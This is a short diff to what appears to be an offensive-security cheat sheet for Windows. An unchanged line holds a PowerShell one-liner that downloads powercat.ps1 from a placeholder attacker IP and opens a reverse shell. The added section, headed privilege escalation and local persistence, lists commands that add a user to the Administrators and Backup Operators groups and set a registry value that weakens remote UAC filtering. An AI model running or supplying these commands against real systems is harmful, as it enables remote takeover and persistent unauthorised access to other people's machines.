@@ -71,3 +71,13 @@ Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker's IP]:8080/powercat.ps1'); powercat -c [Attacker's IP] -p 1337 -ep
 ```
 
+# Windows Privilege Escalation
+
+# Windows Local Persistence
+
+```
+net localgroup administrators username /add
+net localgroup "Backup Operators" username /add
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+```
+
